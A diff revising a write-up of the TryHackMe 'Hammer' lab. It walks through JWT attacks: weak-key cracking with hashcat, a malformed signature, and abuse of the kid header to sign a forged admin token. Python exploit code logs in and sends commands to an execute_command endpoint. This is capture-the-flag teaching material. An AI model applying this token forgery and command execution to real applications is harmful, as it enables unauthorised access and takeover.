@@ -16,11 +16,13 @@ Visiting the URL at `/188ade1.key` downloads a file with the content:&#x20;
 
 ## Exploiting JWT
 
-Upon analysis of the retrieved JWT token value ([http://jwt.io/](http://jwt.io/)), I noticed the `kid` field present in the headers. Moreover, there is a `role` field in the payload, which controls the user role. The goal will be to change this value to a higher privilege user such as `admin`.
+Upon analysis of the retrieved JWT token value (using [http://jwt.io/](http://jwt.io/)), I noticed the `kid` field present in the headers. Moreover, there is a `role` field in the payload, which controls the user role. The goal will be to change this value to a higher privilege user such as `admin`.
 
-Based on the OWASP WSTG testing guide ([https://github.com/OWASP/wstg/blob/master/document/4-Web\_Application\_Security\_Testing/06-Session\_Management\_Testing/10-Testing\_JSON\_Web\_Tokens.md](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)), I decided to test the JWT based vulnerabilities.
+Based on the [OWASP WSTG](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md) testing guide, I decided to test the JWT based vulnerabilities.
 
-**The following Python script will be used for the test:**
+I developed a Python script for the testing. First, we will need to login using the `login()`  function. This ensures that we retrieve a new `PHPSESSID` that is associated with the email. Secondly, a POST request will be send to the `/execute_command.php` path with the command in the request body — for code execution.
+
+The following Python script is just an outline, the respective variables will be different for each test. The final exploit script can be found below.
 
 ```python
 import requests
@@ -30,7 +32,7 @@ class JWT_KID_EXPLOIT():
     s = requests.Session()
     PORT = 1337
     email = 'tester@hammer.thm'
-    password = 'xxx' # password you have reset to
+    password = 'xxx' # value of the new password
 
     def __init__(self, IP):
         self.IP = IP
@@ -46,7 +48,7 @@ class JWT_KID_EXPLOIT():
         # login
         self.login()
 
-        key = '...'
+        key = 'xxx'
 
         payload = {
             "iss": "http://hammer.thm",
@@ -111,15 +113,13 @@ headers = {
 
 ### 2. Weak HMAC Keys
 
-...
-
-#### Default HMAC signing key (`firebase/php-jwt)`&#x20;
+Default HMAC signing key (`firebase/php-jwt)`&#x20;
 
 From our previous enumeration, we have found out that the application uses `firebase/php-jwt v6.10.0` (refer to [https://jarrettgxz-sec.gitbook.io/offensive-security-concepts/write-ups/tryhackme/hammer/enumeration-active-recon/further-directory-discovery](https://jarrettgxz-sec.gitbook.io/offensive-security-concepts/write-ups/tryhackme/hammer/enumeration-active-recon/further-directory-discovery)).&#x20;
 
 However, from research, it appears that this package does not employ any default signing keys.&#x20;
 
-#### Brute force cracking of the HMAC key
+#### Brute force cracking the HMAC key
 
 Utilizing hashcat, I attempted to brute force the key using two wordlists from Daniel Miessler's SecLists:
 
@@ -140,7 +140,7 @@ The brute force attempt failed, and I was unable to find the valid signing key.
 
 #### Malformed signature
 
-Remove the `jwt.encode()` line, and retrieve the token from the existing cookies instead. To malform the signature, remove the last character from the token.
+Remove the `jwt.encode()` line, and retrieve the token from the existing cookies instead. There are many ways to malform the signature. For this test, I decided to remove the last character from the token.
 
 <pre class="language-python"><code class="lang-python"><strong>token = self.s.cookies.get('token')
 </strong><strong>token = token[:-1] # remove the last character
@@ -152,7 +152,7 @@ Output:
 
 ### 3. Vulnerable `kid` header value
 
-In this application which uses a symmetric key, the `kid` value defines the path used to look up a value to be used as the signing key.
+In our application, a symmetric key is used.  Thus, the `kid` value defines the path used to look up a value to be used as the signing key.
 
 I attempted to change the `kid` value to `188ade1.key`, and encode a new JWT with the content of that file.
 
@@ -186,7 +186,7 @@ class JWT_KID_EXPLOIT():
     s = requests.Session()
     PORT = 1337
     email = 'tester@hammer.thm'
-    password = 'xxx' # password you have reset to
+    password = 'xxx' # value of the new password
 
     def __init__(self, IP):
         self.IP = IP
@@ -202,7 +202,7 @@ class JWT_KID_EXPLOIT():
         # login
         self.login()
 
-        key = '56058354efb3daa97ebab00fabd7a7d7'
+        key = '56058354efb3daa97ebab00fabd7a7d7' # retrieved from 188ade1.key
 
         payload = {
             "iss": "http://hammer.thm",
@@ -212,7 +212,7 @@ class JWT_KID_EXPLOIT():
             "data": {
                 "user_id": 1,
                 "email": "tester@hammer.thm",
-                "role": "admin"
+                "role": "admin" # changed from "user" -> "admin"
             }
         }
         headers = {
